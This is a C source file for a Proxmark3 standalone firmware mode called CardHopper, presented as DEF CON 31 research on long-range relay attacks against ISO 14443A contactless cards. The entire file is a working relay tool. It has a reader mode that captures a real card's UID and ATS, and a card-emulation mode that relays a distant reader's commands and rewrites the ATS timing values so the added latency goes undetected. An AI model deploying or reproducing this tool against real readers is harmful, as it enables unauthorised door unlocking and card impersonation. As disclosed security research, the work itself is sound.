/*
 * hf_cardhopper standalone mode by Sam Haskins
 *
 * A component of our (me + Trevor Stevado) research on long-range relay
 * attacks against 14a-based protocols (as presented at DEF CON '31).
 * Works with a CardHopper (recommended) or BlueShark add-on.
 *
 * If you're reading this, you're clearly a very interesting person---
 *  do reach out if you get any fun results? [ sam AT loudmouth DOT io ]
 * Good luck, and may the odds be ever in your favour!
 *
 * The companion Android app is available on our gitlab: gitlab.com/loudmouth-security
 *
 * For more information, see: https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Trevor%20Stevado%20Sam%20Haskins%20-%20Unlocking%20Doors%20from%20Half%20a%20Continent%20Away.pdf
 */

#include <string.h>

#include "appmain.h"
#include "BigBuf.h"
#include "dbprint.h"
#include "fpgaloader.h"
#include "iso14443a.h"
#include "protocols.h"
#include "proxmark3_arm.h"
#include "standalone.h"
#include "ticks.h"
#include "util.h"
#include "usart.h"
#include "cmd.h"
#include "usb_cdc.h"

#ifdef CARDHOPPER_USB
#define cardhopper_write usb_write
#define cardhopper_read usb_read_ng
#define cardhopper_data_available usb_poll_validate_length
#else
#define cardhopper_write usart_writebuffer_sync
#define cardhopper_read usart_read_ng
#define cardhopper_data_available usart_rxdata_available
#endif

void ModInfo(void) {
    DbpString("  HF - Long-range relay 14a over serial<->IP -  a.k.a. CardHopper (Sam Haskins)");
}


typedef struct PACKED {
    uint8_t len;
    uint8_t dat[255];
} packet_t;

// Magic numbers
static const uint8_t magicREAD[4] = "READ";
static const uint8_t magicCARD[4] = "CARD";
static const uint8_t magicEND [4] = "\xff" "END";
static const uint8_t magicRSRT[7] = "RESTART";
static const uint8_t magicERR [4] = "\xff" "ERR";
static       uint8_t magicACK [1] = "\xfe"; // is constant, but must be passed to API that doesn't like that

// Forward declarations
static void become_reader(void);
static void select_card(void);

static void become_card(void);
static void prepare_emulation(uint8_t *, uint16_t *, uint8_t *, packet_t *);
static void cook_ats(packet_t *, uint8_t, uint8_t);
static bool try_use_canned_response(const uint8_t *, int, tag_response_info_t *);
static void reply_with_packet(packet_t *);

static void read_packet(packet_t *);
static void write_packet(packet_t *);

static bool GetIso14443aCommandFromReaderInterruptible(uint8_t *, uint8_t *, int *);


void RunMod(void) {
    // Ensure debug logs don't polute stream
#ifdef CARDHOPPER_USB
    g_reply_via_usb = false;
    g_reply_via_fpc = true;
#else
    g_reply_via_usb = true;
    g_reply_via_fpc = false;
#endif

    StandAloneMode();
    DbpString(_CYAN_("[@]") " CardHopper has started - waiting for mode");
    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);

    clear_trace();
    set_tracing(true);

    // Indicate we are alive and in CardHopper
    LEDsoff();
    LED_A_ON();
    LED_D_ON();

    while (1) {
        WDT_HIT();

        packet_t modeRx = { 0 };
        read_packet(&modeRx);

        if (BUTTON_PRESS()) {
            DbpString(_CYAN_("[@]") " Button pressed - Breaking from mode loop");
            break;
        }

        if (memcmp(magicREAD, modeRx.dat, sizeof(magicREAD)) == 0) {
            DbpString(_CYAN_("[@]") " I am a READER. I talk to a CARD.");
            become_reader();
        } else if (memcmp(magicCARD, modeRx.dat, sizeof(magicCARD)) == 0) {
            DbpString(_CYAN_("[@]") " I am a CARD. I talk to a READER.");
            become_card();
        } else if (memcmp(magicEND, modeRx.dat, sizeof(magicEND)) == 0) {
            break;
        } else {
            DbpString(_YELLOW_("[!]") " unknown mode!");
            Dbhexdump(modeRx.len, modeRx.dat, true);
        }
    }

    DbpString(_CYAN_("[@]") " exiting ...");
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    LEDsoff();
}


static void become_reader(void) {
    iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);
    select_card(); // also sends UID, ATS

    DbpString(_CYAN_("[@]") " entering reader main loop ...");
    packet_t packet = { 0 };
    packet_t *rx = &packet;
    packet_t *tx = &packet;
    uint8_t toCard[256] = { 0 };
    uint8_t parity[MAX_PARITY_SIZE] = { 0 };

    while (1) {
        WDT_HIT();

        read_packet(rx);
        if (memcmp(magicRSRT, rx->dat, sizeof(magicRSRT)) == 0) break;

        if (rx->dat[0] == ISO14443A_CMD_RATS && rx->len == 4) {
            // got RATS from reader, reset the card
            FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
            SpinDelay(40);
            iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);

            // re-select the card without RATS to allow replaying the real RATS
            int ret = iso14443a_select_card(NULL, NULL, NULL, true, 0, true);
            if (ret && ret != 1) {
                Dbprintf(_RED_("[!]") " Error selecting card: %d", ret);
                continue;
            }
        }

        memcpy(toCard, rx->dat, rx->len);
        AddCrc14A(toCard, rx->len);
        ReaderTransmit(toCard, rx->len + 2, NULL);

        tx->len = ReaderReceive(tx->dat, parity);
        if (tx->len == 0) {
            tx->len = sizeof(magicERR);
            memcpy(tx->dat, magicERR, sizeof(magicERR));
        } else tx->len -= 2; // cut off the CRC

        write_packet(tx);
    }
}


static void select_card(void) {
    iso14a_card_select_t card = { 0 };
    while (1) {
        WDT_HIT();

        int ret = iso14443a_select_card(NULL, &card, NULL, true, 0, false);
        if (ret && ret != 1)
            Dbprintf(_RED_("[!]") " Error selecting card: %d", ret);
        if (ret == 1) break;

        SpinDelay(20);
    }

    DbpString(_CYAN_("[@]") " UID:");
    Dbhexdump(card.uidlen, card.uid, false);
    DbpString(_CYAN_("[@]") " ATS:");
    Dbhexdump(card.ats_len - 2 /* no CRC */, card.ats, false);

    packet_t tx = { 0 };
    tx.len = card.uidlen;
    memcpy(tx.dat, card.uid, tx.len);
    write_packet(&tx);

    tx.len = card.ats_len - 2;
    memcpy(tx.dat, card.ats, tx.len);
    write_packet(&tx);
}


static void become_card(void) {
    iso14443a_setup(FPGA_HF_ISO14443A_TAGSIM_LISTEN);

    uint8_t tagType;
    uint16_t flags;
    uint8_t data[PM3_CMD_DATA_SIZE] = { 0 };
    packet_t ats = { 0 };
    prepare_emulation(&tagType, &flags, data, &ats);

    tag_response_info_t *canned;
    uint32_t cuid;
    uint32_t counters[3] = { 0 };
    uint8_t tearings[3] = { 0xbd, 0xbd, 0xbd };
    uint8_t pages;
    SimulateIso14443aInit(tagType, flags, data, &canned, &cuid, counters, tearings, &pages);

    DbpString(_CYAN_("[@]") " Setup done - entering emulation loop");
    int fromReaderLen;
    uint8_t fromReaderDat[256] = { 0 };
    uint8_t parity[MAX_PARITY_SIZE] = { 0 };
    packet_t packet = { 0 };
    packet_t *tx = &packet;
    packet_t *rx = &packet;

    while (1) {
        WDT_HIT();

        if (!GetIso14443aCommandFromReaderInterruptible(fromReaderDat, parity, &fromReaderLen)) {
            if (cardhopper_data_available()) {
                read_packet(rx);
                if (memcmp(magicRSRT, rx->dat, sizeof(magicRSRT)) == 0) {
                    DbpString(_CYAN_("[@]") " Breaking from emulation loop");
                    break;
                }
            } else if (BUTTON_PRESS()) {
                DbpString(_CYAN_("[@]") " Button pressed - Breaking from emulation loop");
                break;
            }
            continue;
        }

        // Option 1: Use a canned response
        if (try_use_canned_response(fromReaderDat, fromReaderLen, canned)) continue;

        // Option 2: Reply with our cooked ATS
        bool no_reply = false;
        if (fromReaderDat[0] == ISO14443A_CMD_RATS && fromReaderLen == 4) {
            reply_with_packet(&ats);

            // fallthrough to still send the RATS to the card so it can learn the CID
            // but don't send the reply since we've already sent our cooked ATS
            no_reply = true;
        }

        // Option 3: Relay the message
        tx->len = fromReaderLen - 2; // cut off the crc
        memcpy(tx->dat, fromReaderDat, tx->len);
        write_packet(tx);

        read_packet(rx);
        if (!no_reply && rx->len > 0) {
            reply_with_packet(rx);
        }
    }
}


static void prepare_emulation(uint8_t *tagType, uint16_t *flags, uint8_t *data, packet_t *ats) {
    packet_t tagTypeRx = { 0 };
    read_packet(&tagTypeRx);
    packet_t timeModeRx = { 0 };
    read_packet(&timeModeRx);
    packet_t uidRx = { 0 };
    read_packet(&uidRx);
    read_packet(ats);

    *tagType = tagTypeRx.dat[0];
    Dbprintf(_CYAN_("[@]") " Using tag type: %hhu", *tagType);

    DbpString(_CYAN_("[@]") " Time control parameters:");
    Dbhexdump(timeModeRx.len, timeModeRx.dat, false);
    uint8_t fwi  = timeModeRx.dat[0] & 0x0f;
    uint8_t sfgi = timeModeRx.dat[1] & 0x0f;
    Dbprintf(_CYAN_("[@]") " Parsed as fwi = %hhu, sfgi = %hhu", fwi, sfgi);

    if (fwi == 0xf) {
        DbpString(_YELLOW_("[!]") " Refusing to use 15 as FWI - will use 14");
        fwi = 0xe;
    }
    if (sfgi == 0xf) {
        DbpString(_YELLOW_("[!]") " Refusing to use 15 as SFGI - will use 14");
        sfgi = 0xe;
    }

    memcpy(data, uidRx.dat, uidRx.len);
    *flags = (uidRx.len == 10 ? FLAG_10B_UID_IN_DATA : (uidRx.len == 7 ? FLAG_7B_UID_IN_DATA : FLAG_4B_UID_IN_DATA));
    DbpString(_CYAN_("[@]") " UID:");
    Dbhexdump(uidRx.len, data, false);
    Dbprintf(_CYAN_("[@]") " Flags: %hu", *flags);

    DbpString(_CYAN_("[@]") " Original ATS:");
    Dbhexdump(ats->len, ats->dat, false);
    cook_ats(ats, fwi, sfgi);
    DbpString(_CYAN_("[@]") " Cooked ATS:");
    Dbhexdump(ats->len, ats->dat, false);
}


static void cook_ats(packet_t *ats, uint8_t fwi, uint8_t sfgi) {
    if (ats->len != ats->dat[0]) {
        DbpString(_RED_("[!]") " Malformed ATS - unable to cook; things may go wrong!");
        return;
    }

    uint8_t t0 = 0x70; // TA, TB, and TC transmitted, FSCI nibble set later
    uint8_t ta = 0x80; // only 106kbps rate supported, and must be same in both directions - PM3 doesn't support any other rates
    uint8_t tb = (fwi << 4) | sfgi; // cooked value
    uint8_t tc = 0;

    uint8_t historical_len = 0;
    uint8_t *historical_bytes;
    if (ats->len > 1) {
        // T0 byte exists when ats length > 1

        uint8_t orig_t0 = ats->dat[1];
        // Update FSCI in T0 from the received ATS
        t0 |= orig_t0 & 0x0F;

        uint8_t len = ats->len - 2;
        uint8_t *orig_ats_ptr = &ats->dat[2];
        if (orig_t0 & 0x10) {
            // TA present
            if (len < 1) {
                DbpString(_RED_("[!]") " Malformed ATS - unable to cook; things may go wrong!");
                return;
            }
            orig_ats_ptr++;
            len--;
        }
        if (orig_t0 & 0x20) {
            // TB present
            if (len < 1) {
                DbpString(_RED_("[!]") " Malformed ATS - unable to cook; things may go wrong!");
                return;
            }
            orig_ats_ptr++;
            len--;
        }
        if (orig_t0 & 0x40) {
            // TC present, extract protocol parameters
            if (len < 1) {
                DbpString(_RED_("[!]") " Malformed ATS - unable to cook; things may go wrong!");
                return;
            }
            tc = *orig_ats_ptr;
            orig_ats_ptr++;
            len--;
        }

        historical_bytes = orig_ats_ptr;
        historical_len = len;
    } else {
        // T0 byte missing, update FSCI in T0 to the default value of 2
        t0 |= 0x02;
    }

    packet_t cooked_ats = { 0 };
    cooked_ats.len = 5 + historical_len;
    cooked_ats.dat[0] = cooked_ats.len;
    cooked_ats.dat[1] = t0;
    cooked_ats.dat[2] = ta;
    cooked_ats.dat[3] = tb;
    cooked_ats.dat[4] = tc;

    if (historical_len > 0) {
        memcpy(cooked_ats.dat + 5, historical_bytes, historical_len);
    }

    memcpy(ats, &cooked_ats, sizeof(packet_t));
}


static bool try_use_canned_response(const uint8_t *dat, int len, tag_response_info_t *canned) {
    if ((dat[0] == ISO14443A_CMD_REQA || dat[0] == ISO14443A_CMD_WUPA) && len == 1) {
        EmSendPrecompiledCmd(canned + RESP_INDEX_ATQA);
        return true;
    }

    if (dat[1] == 0x20 && len == 2) {
        if (dat[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT) {
            EmSendPrecompiledCmd(canned + RESP_INDEX_UIDC1);
            return true;
        } else if (dat[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_2) {
            EmSendPrecompiledCmd(canned + RESP_INDEX_UIDC2);
            return true;
        } else if (dat[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_3) {
            EmSendPrecompiledCmd(canned + RESP_INDEX_UIDC3);
            return true;
        }
    }

    if (dat[1] == 0x70 && len == 9) {
        if (dat[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT) {
            EmSendPrecompiledCmd(canned + RESP_INDEX_SAKC1);
            return true;
        } else if (dat[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_2) {
            EmSendPrecompiledCmd(canned + RESP_INDEX_SAKC2);
            return true;
        } else if (dat[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_3) {
            EmSendPrecompiledCmd(canned + RESP_INDEX_SAKC3);
            return true;
        }
    }

    // high nibble of PPS is PPS CMD, low nibble of PPS is CID
    if ((dat[0] & 0xF0) == ISO14443A_CMD_PPS) {
        EmSendPrecompiledCmd(canned + RESP_INDEX_PPS);
        return true;
    }

    // No response is expected to these 14a commands
    if ((dat[0] & 0xF7) == ISO14443A_CMD_WTX) return true; // bit 0x08 indicates CID following
    if (dat[0] == ISO14443A_CMD_HALT && len == 4) return true;

    // Ignore Apple ECP2 polling
    if (dat[0] == ECP_HEADER) return true;

    return false;
}


static uint8_t g_responseBuffer  [512 ] = { 0 };
static uint8_t g_modulationBuffer[1024] = { 0 };

static void reply_with_packet(packet_t *packet) {
    tag_response_info_t response = { 0 };
    response.response = g_responseBuffer;
    response.modulation = g_modulationBuffer;

    memcpy(response.response, packet->dat, packet->len);
    AddCrc14A(response.response, packet->len);
    response.response_n = packet->len + 2;

    prepare_tag_modulation(&response, sizeof(g_modulationBuffer));
    EmSendPrecompiledCmd(&response);
}


static void read_packet(packet_t *packet) {
    while (!cardhopper_data_available()) {
        WDT_HIT();
        SpinDelayUs(100);
        if (BUTTON_PRESS()) {
            DbpString(_CYAN_("[@]") " Button pressed while waiting for packet - aborting");
            return;
        }
    }

    cardhopper_read((uint8_t *) &packet->len, 1);

    uint32_t dataReceived = 0;
    while (dataReceived != packet->len) {
        while (!cardhopper_data_available()) {
            WDT_HIT();
            if (BUTTON_PRESS()) {
                DbpString(_CYAN_("[@]") " Button pressed while reading packet - aborting");
                return;
            }
        }

        dataReceived += cardhopper_read(packet->dat + dataReceived, packet->len - dataReceived);

        if (packet->len == 0x50 && dataReceived >= sizeof(PacketResponseNGPreamble) && packet->dat[0] == 0x4D && packet->dat[1] == 0x33 && packet->dat[2] == 0x61) {
            // PM3 NG packet magic
            DbpString(_CYAN_("[@]") " PM3 NG packet recieved - ignoring");

            // clear any remaining buffered data
            while (cardhopper_data_available()) {
                cardhopper_read(packet->dat, 255);
            }

            packet->len = 0;
            return;
        }
    }
    cardhopper_write(magicACK, sizeof(magicACK));
}


static void write_packet(packet_t *packet) {
    cardhopper_write((uint8_t *) packet, packet->len + 1);
}


static bool GetIso14443aCommandFromReaderInterruptible(uint8_t *received, uint8_t *par, int *len) {
    LED_D_OFF();
    FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_ISO14443A | FPGA_HF_ISO14443A_TAGSIM_LISTEN);

    Uart14aInit(received, par);

    uint8_t b = (uint8_t)AT91C_BASE_SSC->SSC_RHR;
    (void)b;

    uint8_t flip = 0;
    uint16_t checker = 4000;
    for (;;) {
        WDT_HIT();

        if (flip == 3) {
            if (cardhopper_data_available() || BUTTON_PRESS())
                return false;

            flip = 0;
        }

        if (checker-- == 0) {
            flip++;
            checker = 4000;
        }

        if (AT91C_BASE_SSC->SSC_SR & (AT91C_SSC_RXRDY)) {
            b = (uint8_t)AT91C_BASE_SSC->SSC_RHR;
            if (Uart14aMillerDecoding(b, 0)) {
                *len = GetUart14a()->len;
                return true;
            }
        }
    }
    return false;
}
